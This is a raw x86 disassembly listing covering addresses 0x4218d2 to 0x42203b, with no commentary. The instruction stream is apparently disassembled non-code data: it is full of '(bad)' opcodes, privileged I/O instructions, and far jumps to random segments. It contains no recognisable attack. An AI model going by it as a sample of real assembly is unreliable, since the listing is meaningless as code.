  4218d2:	xlat   BYTE PTR ds:[ebx]
  4218d3:	fidiv  DWORD PTR [esi]
  4218d5:	mov    ds:0x6ea67e52,eax
  4218da:	hlt    
  4218db:	lods   eax,DWORD PTR ds:[esi]
  4218dc:	(bad)
  4218df:	aad    0xa
  4218e1:	xor    esi,DWORD PTR [ecx+esi*1-0x39]
  4218e5:	fmul   DWORD PTR [edi+0x57d66af7]
  4218eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ec:	jns    0x421871
  4218ee:	sub    edi,DWORD PTR [esi]
  4218f0:	test   dh,dl
  4218f2:	lds    ebp,FWORD PTR [eax+0x7c]
  4218f5:	sub    edx,ebx
  4218f7:	mov    al,BYTE PTR [eax+0x4de572ce]
  4218fd:	adc    al,0xe9
  4218ff:	adc    ebp,esi
  421901:	test   bl,cl
  421903:	lea    edx,[ebx]
  421905:	shl    BYTE PTR [edi-0x7d303d62],1
  42190b:	mov    dl,0x29
  42190d:	inc    ecx
  42190e:	int3   
  42190f:	push   ds
  421910:	mov    BYTE PTR [esi+0x69bd5dee],bl
  421916:	push   ebx
  421917:	adc    al,0x35
  421919:	std    
  42191a:	mov    ds:0x69746add,al
  42191f:	das    
  421920:	sbb    al,0x8b
  421922:	ror    DWORD PTR [edx+esi*8+0x6d],1
  421926:	fld    QWORD PTR [ebp-0x65]
  421929:	xchg   ebx,eax
  42192a:	dec    edi
  42192b:	dec    ecx
  42192c:	xchg   ebp,eax
  42192d:	iret   
  42192e:	xchg   edx,eax
  42192f:	clc    
  421930:	cs call 0x6d32:0x129b3f6a
  421938:	neg    DWORD PTR [esi-0x4c]
  42193b:	xor    eax,0x99e02d2a
  421940:	cmc    
  421941:	aaa    
  421942:	ins    DWORD PTR es:[edi],dx
  421943:	push   ds
  421944:	stos   DWORD PTR es:[edi],eax
  421945:	sub    bl,BYTE PTR [esi]
  421947:	or     al,0x77
  421949:	addr16 enter 0x4c88,0x46
  42194e:	bswap  ebp
  421950:	mov    cl,0x98
  421952:	xchg   esi,eax
  421953:	mov    dl,0x48
  421955:	xor    BYTE PTR [ebx],bh
  421957:	daa    
  421958:	rol    BYTE PTR [eax+0x43173038],cl
  42195e:	mov    WORD PTR [ecx+eiz*8+0x6f],es
  421962:	jb     0x421931
  421964:	xchg   esp,eax
  421965:	xchg   DWORD PTR [ebx+0x50],edi
  421968:	add    al,0x66
  42196a:	pop    ds
  42196b:	dec    ebp
  42196c:	test   DWORD PTR [edi],ecx
  42196e:	xor    eax,0x8fa79227
  421973:	shl    edi,0x2b
  421976:	stos   DWORD PTR es:[edi],eax
  421977:	xlat   BYTE PTR ds:[ebx]
  421978:	ins    BYTE PTR es:[edi],dx
  421979:	mov    eax,0x60190c03
  42197e:	or     eax,0x46540911
  421983:	adc    bx,WORD PTR [edi+0x3aadb470]
  42198a:	xchg   esi,eax
  42198b:	imul   esi,ebp,0x800f3e1f
  421991:	sbb    esi,DWORD PTR [ecx+edi*2]
  421994:	dec    ecx
  421995:	(bad)  
  421996:	or     ecx,DWORD PTR [edi-0x2505b47b]
  42199c:	and    dh,BYTE PTR [ebx]
  42199e:	inc    eax
  42199f:	mov    ah,0x66
  4219a1:	mov    dh,BYTE PTR [ebp+0x68]
  4219a4:	in     eax,dx
  4219a5:	mov    dl,0x0
  4219a7:	xor    eax,0xe107c63e
  4219ac:	arpl   ax,bx
  4219ae:	aaa    
  4219af:	mov    esp,0x3bb125b5
  4219b4:	lods   al,BYTE PTR ds:[esi]
  4219b5:	pop    eax
  4219b6:	xchg   edi,eax
  4219b7:	sbb    al,0x12
  4219b9:	arpl   WORD PTR ds:0x52346342,bx
  4219bf:	dec    ecx
  4219c0:	data16 adc BYTE PTR ds:0x41aa56ed,ch
  4219c7:	fstp   TBYTE PTR [eax]
  4219c9:	test   al,0xdc
  4219cb:	jnp    0x4219f5
  4219cd:	push   0x3f830df6
  4219d2:	out    dx,eax
  4219d3:	jg     0x4219f2
  4219d5:	pop    esi
  4219d6:	test   BYTE PTR [edx+0x6f],bh
  4219d9:	inc    ecx
  4219da:	imul   ebx,edx,0x7c978c74
  4219e0:	shl    BYTE PTR [ebp-0x6d],0xd5
  4219e4:	mov    ds:0x31aeab01,al
  4219e9:	jecxz  0x4219fd
  4219eb:	add    edx,esp
  4219ed:	ret    
  4219ee:	mov    edi,fs
  4219f0:	test   al,0x9b
  4219f2:	test   al,0x8c
  4219f4:	fisttp DWORD PTR [ecx+0x4574bad9]
  4219fa:	int    0x19
  4219fc:	adc    al,0xe1
  4219fe:	pop    edx
  4219ff:	sbb    BYTE PTR [edi],ah
  421a01:	inc    esi
  421a02:	jne    0x421a3a
  421a04:	out    dx,al
  421a05:	dec    ebp
  421a06:	pop    ebp
  421a07:	mov    eax,0xf670f81a
  421a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a0d:	cmp    esp,DWORD PTR [eax+ebx*1+0x76d4c594]
  421a14:	lds    eax,FWORD PTR [ebp-0x13]
  421a17:	add    edi,edx
  421a19:	aaa    
  421a1a:	cmp    al,0xb9
  421a1c:	cmp    ebx,0x9a26524c
  421a22:	mov    BYTE PTR [edi+0x1e22caad],dh
  421a28:	xlat   BYTE PTR ds:[ebx]
  421a29:	mov    ah,BYTE PTR ds:0x727aa2eb
  421a2f:	dec    esp
  421a30:	add    esi,DWORD PTR [ebp+0x3b]
  421a33:	pop    edx
  421a34:	mov    dl,0xc9
  421a36:	stc    
  421a37:	jbe    0x4219ff
  421a39:	mov    al,0xb5
  421a3b:	add    BYTE PTR [edx-0x68],ah
  421a3e:	(bad)  
  421a3f:	mov    esp,0x807f0353
  421a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a45:	pop    edi
  421a46:	mov    cl,0xb3
  421a48:	jle    0x421a32
  421a4a:	cmp    eax,0x178fe292
  421a4f:	mov    ss:0x670dbd95,al
  421a55:	sahf   
  421a56:	mov    al,ds:0xf58849f3
  421a5b:	jmp    0x421ac6
  421a5d:	outs   dx,DWORD PTR ds:[esi]
  421a5e:	dec    cx
  421a60:	adc    eax,DWORD PTR ds:0xd72fdea0
  421a66:	in     eax,dx
  421a67:	jns    0x4219f9
  421a69:	mov    ch,0xe3
  421a6b:	push   0x7e
  421a6d:	test   al,0xb1
  421a6f:	xchg   edx,eax
  421a70:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a72:	inc    edi
  421a73:	mov    eax,0x9735ea53
  421a78:	aaa    
  421a79:	nop
  421a7a:	lods   al,BYTE PTR ds:[esi]
  421a7b:	mov    bl,0xe0
  421a7d:	ds sbb al,0xaf
  421a80:	jmp    0xa2404df4
  421a85:	mov    bh,0x5f
  421a87:	xor    al,BYTE PTR [ebx]
  421a89:	pop    edi
  421a8a:	sub    eax,0x19527b99
  421a8f:	sbb    eax,0xfc3e3b68
  421a94:	popa   
  421a95:	push   edi
  421a96:	scas   al,BYTE PTR es:[edi]
  421a97:	cmp    ch,dh
  421a99:	pop    edx
  421a9a:	xor    edx,DWORD PTR [eax+0x25]
  421a9d:	(bad)  
  421a9e:	jl     0x421b0e
  421aa0:	add    eax,0xd63c413b
  421aa5:	(bad)  
  421aa7:	push   esi
  421aa8:	inc    esp
  421aa9:	pushf  
  421aaa:	xor    BYTE PTR [ebx+eax*4+0x0],dh
  421aae:	imul   edx,edx,0xc8ce7e32
  421ab4:	icebp  
  421ab5:	jmp    0x421b36
  421ab7:	test   DWORD PTR [ebx-0x63f90917],ebp
  421abd:	mov    dh,0x38
  421abf:	leave  
  421ac0:	xlat   BYTE PTR ds:[ebx]
  421ac1:	int3   
  421ac2:	test   al,0x14
  421ac4:	fs sub ebp,esi
  421ac7:	jo     0x421a73
  421ac9:	repz rcl DWORD PTR [eax+0x7],0x47
  421ace:	inc    eax
  421acf:	and    al,0x5f
  421ad1:	fs inc ebx
  421ad3:	cmp    al,BYTE PTR [ebx]
  421ad5:	retf   0x11a1
  421ad8:	dec    ebp
  421ad9:	sub    BYTE PTR [ecx],cl
  421adb:	adc    BYTE PTR [edi+0x7843b991],dl
  421ae1:	repz mov esp,0x22c9d7a6
  421ae7:	imul   edx,DWORD PTR [ebx],0x62785c9d
  421aed:	out    dx,al
  421aee:	xor    edx,ebx
  421af0:	add    ebx,edi
  421af2:	les    esp,FWORD PTR [edi+0x5fb4069d]
  421af8:	mov    esp,cs
  421afa:	and    bh,cl
  421afc:	and    al,0x86
  421afe:	pop    edi
  421aff:	lea    esi,[edx+ecx*2+0x6a]
  421b03:	int3   
  421b04:	iret   
  421b05:	sbb    dh,dh
  421b07:	mov    dl,0x93
  421b09:	mov    bl,0xb8
  421b0b:	cmp    al,0x7b
  421b0d:	ret    
  421b0e:	adc    al,0x6e
  421b10:	test   BYTE PTR [ecx+eax*2+0x18],dh
  421b14:	nop
  421b15:	ss inc esi
  421b17:	aad    0x12
  421b19:	in     al,0x88
  421b1b:	(bad)  
  421b1c:	ja     0x421b5c
  421b1e:	fstp   st(7)
  421b20:	mov    dl,0x1f
  421b22:	test   BYTE PTR ds:0xa81f5aea,cl
  421b28:	lods   eax,DWORD PTR ds:[esi]
  421b29:	mov    dh,0xf
  421b2b:	sbb    al,BYTE PTR [ecx]
  421b2d:	and    ebx,DWORD PTR [ebx-0x20f304b]
  421b33:	call   0x3813:0xf134b205
  421b3a:	cmp    eax,DWORD PTR [ecx+0x4715491]
  421b40:	lods   eax,DWORD PTR ds:[esi]
  421b41:	(bad)  
  421b42:	sahf   
  421b43:	xor    DWORD PTR [edi+0x60],ebx
  421b46:	jno    0x421baa
  421b48:	outs   dx,DWORD PTR ds:[esi]
  421b49:	mov    bl,0x3c
  421b4b:	mov    ch,0x23
  421b4d:	lods   eax,DWORD PTR ds:[esi]
  421b4e:	adc    ch,BYTE PTR [ecx-0x17]
  421b51:	in     al,dx
  421b52:	xchg   esi,eax
  421b53:	xchg   edi,eax
  421b54:	cmp    ebx,DWORD PTR [esi+0x6639232f]
  421b5a:	sbb    al,0x7a
  421b5c:	xchg   BYTE PTR [edi+0x18],bh
  421b5f:	aad    0x26
  421b61:	addr16 sub al,ah
  421b64:	xor    ah,dh
  421b66:	(bad)  
  421b67:	stos   DWORD PTR es:[edi],eax
  421b68:	adc    BYTE PTR [esi-0x5d221075],0xa5
  421b6f:	xor    eax,0x25599c6f
  421b74:	loop   0x421b10
  421b76:	jmp    0x16f8:0x95b99b18
  421b7d:	inc    esi
  421b7e:	adc    bl,BYTE PTR [ecx]
  421b80:	dec    ebx
  421b81:	(bad)  [ebx]
  421b83:	fcmovu st,st(6)
  421b85:	xchg   ebx,eax
  421b86:	inc    edi
  421b87:	sub    DWORD PTR [ecx-0x5efc6b97],0xd303bc2f
  421b91:	jl     0x421b8c
  421b93:	fwait
  421b94:	cs push edi
  421b96:	pop    ebp
  421b97:	pusha  
  421b98:	mov    al,ds:0xa6899b76
  421b9d:	push   ebx
  421b9e:	scas   al,BYTE PTR es:[edi]
  421b9f:	in     eax,0xd1
  421ba1:	adc    bl,BYTE PTR [edi+ecx*4-0x66ea0568]
  421ba8:	push   esp
  421ba9:	mov    ecx,0xef89ada5
  421bae:	fidiv  DWORD PTR [edi+eax*2-0x4f716e67]
  421bb5:	js     0x421bf3
  421bb7:	pop    ds
  421bb8:	and    ch,BYTE PTR [ebp+ecx*2-0x50]
  421bbc:	stos   DWORD PTR es:[edi],eax
  421bbd:	mov    ?,esi
  421bbf:	add    al,0x1b
  421bc1:	xor    eax,0x4b6b67ad
  421bc6:	inc    ebx
  421bc7:	scas   eax,DWORD PTR es:[edi]
  421bc8:	cmc    
  421bc9:	pop    ecx
  421bca:	sub    dh,al
  421bcc:	sub    eax,esi
  421bce:	jnp    0x421bb8
  421bd0:	imul   esi,DWORD PTR [eax+0x7a9a0381],0xffffffa6
  421bd7:	inc    esp
  421bd8:	push   ds
  421bd9:	leave  
  421bda:	test   BYTE PTR [ebx-0x14],al
  421bdd:	cmp    edi,ebp
  421bdf:	std    
  421be0:	(bad)  
  421be1:	scas   eax,DWORD PTR es:[edi]
  421be2:	cmp    edi,DWORD PTR [ebp+0x799511ed]
  421be8:	or     eax,0x522f3c72
  421bed:	pop    edi
  421bee:	and    al,0x60
  421bf0:	fwait
  421bf1:	push   ecx
  421bf2:	loop   0x421baf
  421bf4:	inc    DWORD PTR [eax-0x48]
  421bf7:	hlt    
  421bf8:	cli    
  421bf9:	mov    esi,edi
  421bfb:	adc    esp,ebp
  421bfd:	mov    ss,esi
  421bff:	mov    WORD PTR [esi],cs
  421c01:	mov    al,0x88
  421c03:	pop    esi
  421c04:	stc    
  421c05:	jo     0x421c24
  421c07:	ins    BYTE PTR es:[edi],dx
  421c08:	add    BYTE PTR [edx+0xc],cl
  421c0b:	sbb    bh,BYTE PTR ds:0x3e1bd264
  421c11:	test   eax,0x999b0384
  421c16:	mov    eax,0x4a8a0df5
  421c1b:	xchg   esp,eax
  421c1c:	or     esi,DWORD PTR [ebx+0x72]
  421c1f:	xor    al,0x9d
  421c21:	inc    edx
  421c22:	scas   eax,DWORD PTR es:[edi]
  421c23:	mov    ah,0xfe
  421c25:	cs daa 
  421c27:	inc    ecx
  421c28:	xchg   ecx,eax
  421c29:	and    al,0xe0
  421c2b:	sbb    ebp,edi
  421c2d:	fwait
  421c2e:	pop    ecx
  421c2f:	aaa    
  421c30:	lock dec ebp
  421c32:	mov    dh,0x8b
  421c34:	inc    ebx
  421c35:	dec    ecx
  421c36:	mov    dl,0xf3
  421c38:	dec    eax
  421c39:	add    esp,DWORD PTR [edx+0x548cc8ec]
  421c3f:	xchg   edi,eax
  421c40:	aad    0xf3
  421c42:	and    edi,DWORD PTR [eax*2-0x19286502]
  421c49:	dec    edx
  421c4a:	mov    eax,ds:0x11d63bcf
  421c4f:	inc    esi
  421c50:	loope  0x421c36
  421c52:	inc    esi
  421c53:	and    eax,0xc8927179
  421c58:	mov    bl,BYTE PTR [edx+eiz*2]
  421c5b:	loopne 0x421c9c
  421c5d:	or     ah,BYTE PTR [ebx]
  421c5f:	mov    edx,0x569c9b7e
  421c64:	sahf   
  421c65:	fcmove st,st(5)
  421c67:	or     ecx,DWORD PTR [ecx+ebx*2+0x79]
  421c6b:	mov    esi,0x2762e319
  421c70:	mov    edi,0xad14208f
  421c75:	je     0x421c8e
  421c77:	(bad)  
  421c78:	(bad)  
  421c79:	ror    BYTE PTR [edx+0x73e1db06],cl
  421c7f:	inc    ebx
  421c80:	(bad)  
  421c81:	xchg   esp,eax
  421c82:	loope  0x421c92
  421c84:	inc    esi
  421c85:	pop    ds
  421c86:	in     eax,dx
  421c87:	pop    esi
  421c88:	dec    ebx
  421c89:	cmp    al,ch
  421c8b:	push   ds
  421c8c:	add    BYTE PTR [edi-0x6033f383],bl
  421c92:	cld    
  421c93:	loop   0x421cd1
  421c95:	je     0x421d0d
  421c97:	mov    edi,0x74ad9ab9
  421c9c:	cmc    
  421c9d:	loopne 0x421cbb
  421c9f:	pop    ebx
  421ca0:	nop
  421ca1:	imul   BYTE PTR [ebx-0x6c]
  421ca4:	mov    eax,DWORD PTR [esp+ebp*1-0x14]
  421ca8:	ror    DWORD PTR [edx-0x7d9881f2],0xf8
  421caf:	lods   eax,DWORD PTR ds:[esi]
  421cb0:	add    DWORD PTR [edx-0x6d8d6032],ebp
  421cb6:	pop    esp
  421cb7:	or     al,0xab
  421cb9:	fbstp  TBYTE PTR [ebp+0x70]
  421cbc:	outs   dx,WORD PTR ds:[esi]
  421cbe:	pop    ds
  421cbf:	mul    DWORD PTR [ecx-0xac870cb]
  421cc5:	jo     0x421d01
  421cc7:	popa   
  421cc8:	sbb    dl,bl
  421cca:	clc    
  421ccb:	mov    bh,0xfc
  421ccd:	jns    0x421d0e
  421ccf:	fld    QWORD PTR [edi]
  421cd1:	ds push 0x5c9bcb02
  421cd7:	xchg   edx,eax
  421cd8:	call   0xb5d7:0xa5376127
  421cdf:	adc    al,0x2f
  421ce1:	das    
  421ce2:	or     al,ah
  421ce4:	scas   al,BYTE PTR es:[edi]
  421ce5:	(bad)  
  421ce6:	std    
  421ce7:	outs   dx,DWORD PTR ds:[esi]
  421ce8:	stc    
  421ce9:	ret    
  421cea:	int3   
  421ceb:	add    al,0xd4
  421ced:	mov    BYTE PTR [esp+ebp*1+0x7adfd467],0x83
  421cf5:	rcr    DWORD PTR [ebp-0x59],cl
  421cf8:	sub    eax,0x11c1933d
  421cfd:	jecxz  0x421cdf
  421cff:	data16 mov dh,0x13
  421d02:	or     ecx,DWORD PTR [esi+0x35]
  421d05:	pop    ecx
  421d06:	div    al
  421d08:	cdq    
  421d09:	sbb    ebx,DWORD PTR [edx]
  421d0b:	xchg   esp,eax
  421d0c:	jns    0x421d70
  421d0e:	aam    0x2f
  421d10:	adc    DWORD PTR [ebx+0x38],edi
  421d13:	mov    bl,0x65
  421d15:	cld    
  421d16:	mov    esp,0xed3392f8
  421d1b:	arpl   WORD PTR [ecx],cx
  421d1d:	pusha  
  421d1e:	scas   al,BYTE PTR es:[edi]
  421d1f:	dec    esp
  421d20:	scas   al,BYTE PTR es:[edi]
  421d21:	adc    eax,0x29edde55
  421d26:	(bad)  
  421d27:	push   ebx
  421d28:	add    al,BYTE PTR [ebp-0x66]
  421d2b:	(bad)  
  421d2c:	stos   DWORD PTR es:[edi],eax
  421d2d:	adc    al,0x43
  421d2f:	xchg   ecx,eax
  421d30:	pop    ss
  421d31:	add    cl,BYTE PTR [edx]
  421d33:	fsubrp st(4),st
  421d35:	sub    al,0xcf
  421d37:	pop    ebx
  421d38:	xor    eax,0x32961c49
  421d3d:	das    
  421d3e:	lods   eax,DWORD PTR ds:[esi]
  421d3f:	cmp    dh,BYTE PTR [ecx+0x486cc68e]
  421d45:	dec    esp
  421d46:	mov    ebp,0x7718609a
  421d4b:	push   edx
  421d4c:	jecxz  0x421dbd
  421d4e:	scas   al,BYTE PTR es:[edi]
  421d4f:	call   0x6bea627b
  421d54:	jge    0x421d6e
  421d56:	ret    
  421d57:	pop    ebx
  421d58:	or     DWORD PTR [ebx],ebx
  421d5a:	pop    ds
  421d5b:	dec    esi
  421d5c:	xchg   ecx,eax
  421d5d:	stos   DWORD PTR es:[edi],eax
  421d5e:	mov    al,ah
  421d60:	or     ebx,DWORD PTR fs:[eax-0x517c6ce5]
  421d67:	popf   
  421d68:	add    al,0xf7
  421d6a:	(bad)  
  421d6b:	(bad)  
  421d6c:	dec    edx
  421d6d:	xor    BYTE PTR [edi-0x64],dh
  421d70:	ja     0x421dd9
  421d72:	xchg   ebp,eax
  421d73:	push   0x2d
  421d75:	pop    ebx
  421d76:	jno    0x421d5b
  421d78:	stc    
  421d79:	mov    dl,0xbd
  421d7b:	mul    BYTE PTR [eax+0x5cbf8a17]
  421d81:	sbb    bh,0x29
  421d84:	stos   DWORD PTR es:[edi],eax
  421d85:	xor    dh,BYTE PTR [edx-0x51]
  421d88:	xchg   edi,eax
  421d89:	ins    BYTE PTR es:[edi],dx
  421d8a:	jb     0x421d61
  421d8c:	cmc    
  421d8d:	cmp    eax,0xaa253744
  421d92:	addr16 dec ecx
  421d94:	push   0x68
  421d96:	imul   ebp,DWORD PTR [ecx-0x14eb5712],0xef755ecd
  421da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421da1:	out    0x5a,eax
  421da3:	inc    eax
  421da4:	push   ebp
  421da5:	aaa    
  421da6:	cld    
  421da7:	(bad)  
  421da8:	sub    al,0xb
  421daa:	adc    BYTE PTR [ecx+ebp*1],cl
  421dad:	ja     0x421e10
  421daf:	xchg   esp,eax
  421db0:	and    bl,BYTE PTR [ecx-0x56]
  421db3:	sbb    BYTE PTR [eax+0x33],ah
  421db6:	adc    ebx,esi
  421db8:	xchg   edi,eax
  421db9:	dec    eax
  421dba:	pop    edi
  421dbb:	ss daa 
  421dbd:	dec    esi
  421dbe:	dec    ebx
  421dbf:	sub    al,0xf6
  421dc1:	lods   al,BYTE PTR ds:[esi]
  421dc2:	fmulp  st(6),st
  421dc4:	mov    ds:0x1a0f5034,al
  421dc9:	repnz mov eax,DWORD PTR [ecx+0x190b0ace]
  421dd0:	enter  0x6c87,0x9f
  421dd4:	inc    eax
  421dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dd6:	mov    esp,0x1b890283
  421ddb:	loope  0x421d94
  421ddd:	inc    eax
  421dde:	adc    eax,0xd026705d
  421de3:	rol    DWORD PTR [eax],1
  421de5:	ficomp DWORD PTR [ebx+0x7c]
  421de8:	and    ebx,DWORD PTR [esi]
  421dea:	lahf   
  421deb:	ins    DWORD PTR es:[edi],dx
  421dec:	das    
  421ded:	fist   DWORD PTR [edx+eiz*1-0x5d5d56ec]
  421df4:	in     al,0x18
  421df6:	xor    al,0x2c
  421df8:	cs inc ebx
  421dfa:	add    DWORD PTR ds:0x4759fc96,esp
  421e00:	cmc    
  421e01:	mov    cs,WORD PTR [ebx]
  421e03:	mov    ah,0x40
  421e05:	data16 xor BYTE PTR [edx+0x1c],al
  421e09:	loopne 0x421dc2
  421e0b:	mov    bh,0xf5
  421e0d:	xor    DWORD PTR [edx-0x4d56c066],esp
  421e13:	dec    ecx
  421e14:	dec    edi
  421e15:	in     al,dx
  421e16:	push   0x2f
  421e18:	lods   eax,DWORD PTR ds:[esi]
  421e19:	fimul  DWORD PTR [ebx]
  421e1b:	out    0xe1,al
  421e1d:	sub    DWORD PTR [ebx-0x60],edi
  421e20:	retf   
  421e21:	sahf   
  421e22:	pop    ebx
  421e23:	mov    al,0x13
  421e25:	sub    BYTE PTR [edx+ebx*4-0x6d],dl
  421e29:	xchg   edx,eax
  421e2a:	dec    esp
  421e2b:	inc    ebx
  421e2c:	ins    DWORD PTR es:[edi],dx
  421e2d:	xchg   ecx,ecx
  421e2f:	adc    edi,esp
  421e31:	xchg   esi,eax
  421e32:	shl    DWORD PTR [edi+0x6],cl
  421e35:	add    BYTE PTR [eax],dl
  421e37:	mov    eax,0xfbc072b2
  421e3c:	scas   al,BYTE PTR es:[edi]
  421e3d:	sub    dl,bl
  421e3f:	mov    al,0x38
  421e41:	sub    edi,DWORD PTR [ecx]
  421e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e44:	xchg   ebp,ebx
  421e46:	fsub   st(1),st
  421e48:	mov    edx,0x20772e7f
  421e4d:	inc    eax
  421e4e:	and    esp,DWORD PTR [esi+0x27c64618]
  421e54:	lods   al,BYTE PTR ds:[esi]
  421e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e56:	cdq    
  421e57:	sti    
  421e58:	pusha  
  421e59:	mov    ax,cs:0xa4e56690
  421e60:	jb     0x421e3f
  421e62:	mov    edi,0x9aafc772
  421e67:	add    esi,esp
  421e69:	ja     0x421e34
  421e6b:	addr16 jmp 0x337d349c
  421e71:	push   0xb5800217
  421e76:	xchg   esi,eax
  421e77:	inc    esp
  421e78:	je     0x421ec1
  421e7a:	cwde   
  421e7b:	out    0x4,eax
  421e7d:	das    
  421e7e:	in     al,dx
  421e7f:	(bad)  
  421e80:	mul    esi
  421e82:	fidiv  DWORD PTR [eax]
  421e84:	in     al,dx
  421e85:	mov    edx,edx
  421e87:	push   es
  421e88:	adc    dh,BYTE PTR [eax-0x4246cb2f]
  421e8e:	fnstenv [eax]
  421e90:	ret    
  421e91:	fbld   TBYTE PTR [edx-0x3e]
  421e94:	mov    eax,0x2b38998a
  421e99:	adc    DWORD PTR [ebp-0x7181f2e1],eax
  421e9f:	arpl   WORD PTR [ebx],dx
  421ea1:	adc    al,0xa1
  421ea3:	into   
  421ea4:	xor    al,0xd3
  421ea6:	lds    edx,FWORD PTR [edx-0x12525d2c]
  421eac:	jmp    0x1cd1ee74
  421eb1:	adc    edx,DWORD PTR [ebp-0x1b]
  421eb4:	loopne 0x421ecb
  421eb6:	xor    ebp,DWORD PTR [edx]
  421eb8:	call   0x221d7f4a
  421ebd:	js     0x421e42
  421ebf:	adc    eax,0x532e4292
  421ec4:	mov    dh,0x98
  421ec6:	scas   eax,DWORD PTR es:[edi]
  421ec7:	mov    al,0x4a
  421ec9:	fs adc eax,0x498f0ac4
  421ecf:	mov    cl,0x84
  421ed1:	jae    0x421f42
  421ed3:	stos   DWORD PTR es:[edi],eax
  421ed4:	or     esp,DWORD PTR [edi]
  421ed6:	add    BYTE PTR [ecx-0x2b],al
  421ed9:	ins    BYTE PTR es:[edi],dx
  421eda:	sar    DWORD PTR cs:[esi+esi*2+0x3b],cl
  421edf:	pop    eax
  421ee0:	cdq    
  421ee1:	mov    al,0x1c
  421ee3:	pop    ds
  421ee4:	inc    BYTE PTR [ecx+0x72]
  421ee7:	mov    ecx,0xd29383d4
  421eec:	(bad)  [edi+0x52325b44]
  421ef2:	rcl    ebx,0xbb
  421ef5:	inc    edi
  421ef6:	cmc    
  421ef7:	js     0x421f24
  421ef9:	add    al,0x9
  421efb:	loope  0x421ed7
  421efd:	sub    ecx,DWORD PTR [esi]
  421eff:	cmp    eax,0x84439ed6
  421f04:	xor    BYTE PTR [ebp-0x4b],bl
  421f07:	push   eax
  421f08:	in     al,0x18
  421f0a:	jg     0x421f42
  421f0c:	mov    WORD PTR [edx-0x25e3d137],ss
  421f12:	sub    ecx,DWORD PTR [esi+0x6b]
  421f15:	jmp    0x504a:0x20f00960
  421f1c:	adc    DWORD PTR [ecx],edi
  421f1e:	cmc    
  421f1f:	jge    0x421f16
  421f21:	adc    BYTE PTR [ecx-0x220206d7],0x65
  421f28:	mov    ds:0xe668176e,eax
  421f2d:	mov    bl,0x6c
  421f2f:	inc    esi
  421f30:	lock and WORD PTR [ecx-0x6],bx
  421f35:	sub    esp,DWORD PTR [edx-0x34ffb014]
  421f3b:	ror    DWORD PTR ds:[ebp+0x346a70cf],0x28
  421f43:	int    0x8
  421f45:	sub    DWORD PTR [ebx-0x1],edx
  421f48:	sub    BYTE PTR [ebp+0x3610615c],bh
  421f4e:	adc    DWORD PTR [edx+0x315ae6ff],esi
  421f54:	dec    ebx
  421f55:	inc    esi
  421f56:	or     al,dl
  421f58:	out    dx,al
  421f59:	(bad)  
  421f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f5b:	jp     0x421f40
  421f5d:	aad    0x7f
  421f5f:	inc    edi
  421f60:	dec    esi
  421f61:	out    0x5a,eax
  421f63:	push   0xb4d96ac4
  421f68:	sbb    al,0x20
  421f6a:	xor    ch,BYTE PTR [esi+0x6f67ce84]
  421f70:	adc    BYTE PTR [edi+0x38c76aa1],ch
  421f76:	jmp    0x421f15
  421f78:	mov    dl,0xe9
  421f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f7b:	(bad)  
  421f7c:	and    DWORD PTR [ecx+0x1a84265d],edx
  421f82:	pop    edx
  421f83:	dec    ecx
  421f84:	xchg   esi,eax
  421f85:	ds ja  0x421fb0
  421f88:	(bad)  
  421f89:	xchg   edx,eax
  421f8a:	jns    0x421fc6
  421f8c:	xlat   BYTE PTR ds:[ebx]
  421f8d:	cmp    BYTE PTR [edi],0x40
  421f90:	stos   DWORD PTR es:[edi],eax
  421f91:	dec    ecx
  421f92:	adc    BYTE PTR [edi+0x43],ch
  421f95:	dec    esp
  421f96:	pop    edx
  421f97:	hlt    
  421f98:	mov    al,0xc0
  421f9a:	jl     0x421fa2
  421f9c:	in     eax,dx
  421f9d:	mov    ch,0xec
  421f9f:	sub    ecx,esi
  421fa1:	adc    ebp,DWORD PTR [edx-0x7e63afa5]
  421fa7:	pushf  
  421fa8:	mov    bh,0x43
  421faa:	mov    esp,0x7bd6972a
  421faf:	outs   dx,BYTE PTR ds:[esi]
  421fb0:	ja     0x421fdb
  421fb2:	out    dx,eax
  421fb3:	cld    
  421fb4:	xchg   esp,eax
  421fb5:	add    esi,DWORD PTR [esp+edi*1+0x3fea6818]
  421fbc:	mov    ?,WORD PTR [esi+0x22]
  421fbf:	xchg   esp,eax
  421fc0:	fmul   st,st(3)
  421fc2:	mov    esi,0xf409c58e
  421fc7:	inc    edi
  421fc8:	jp     0x421f5e
  421fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fcb:	int3   
  421fcc:	cmc    
  421fcd:	pop    eax
  421fce:	add    eax,DWORD PTR [edx+0x7796d5e4]
  421fd4:	sub    bl,BYTE PTR [eax-0x75]
  421fd7:	jae    0x421fba
  421fd9:	and    eax,0x25f48fd
  421fde:	add    al,0xde
  421fe0:	stos   WORD PTR es:[edi],ax
  421fe2:	cs inc dh
  421fe5:	mov    bl,BYTE PTR [eax-0x2f6e07a3]
  421feb:	test   BYTE PTR [edi],0x1d
  421fee:	mov    edx,0x6b4459f1
  421ff3:	int3   
  421ff4:	jns    0x421ff5
  421ff6:	xchg   edx,eax
  421ff7:	jae    0x421fe4
  421ff9:	daa    
  421ffa:	imul   al
  421ffc:	bound  edx,QWORD PTR [edx]
  421ffe:	cmp    BYTE PTR [edx+0x428840ce],ah
  422004:	push   edx
  422005:	jmp    0x4e9e:0xbcc8b8e4
  42200c:	adc    al,0x25
  42200e:	pop    ebx
  42200f:	in     al,dx
  422010:	and    al,0xd4
  422012:	inc    edx
  422013:	test   eax,0xd8a04053
  422018:	and    ecx,DWORD PTR [ebp+edx*2-0x11a7e1a6]
  42201f:	call   0xbf00:0x1e50d369
  422026:	les    eax,FWORD PTR [eax+0x4f]
  422029:	cld    
  42202a:	jo     0x421fee
  42202c:	push   esp
  42202d:	xchg   esp,eax
  42202e:	xor    esi,DWORD PTR [esi+0x63]
  422031:	xlat   BYTE PTR ds:[ebx]
  422032:	jne    0x42208b
  422034:	jecxz  0x42202d
  422036:	and    eax,0x5807377
  42203b:	fisubr DWORD PTR [edi-0x3f23617d]
